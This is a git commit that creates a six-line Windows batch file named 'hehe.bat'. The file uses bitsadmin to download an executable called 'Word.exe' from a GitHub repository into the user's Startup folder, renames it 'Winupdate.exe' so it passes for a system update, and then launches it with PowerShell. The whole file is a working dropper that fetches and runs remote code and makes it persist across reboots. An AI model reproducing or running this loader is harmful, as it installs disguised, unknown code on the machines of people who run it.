b658cae8881e8cff12e7b846bcf3bd6dec445efa
Profile-VP <56686509+Profile-VP@users.noreply.github.com>
2023-12-11 22:58:57 +0700

    Create hehe.bat

---
+++ hehe.bat
@@ -0,0 +1,6 @@
+ 
+bitsadmin /transfer Packages /download /priority foreground https://github.com/Profile-VP/hm/raw/main/Word.exe "C:\Users\cc123\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Winupdate.exe" 
+ 
+powershell -command "start Winupdate.exe" 
+ 
+ 
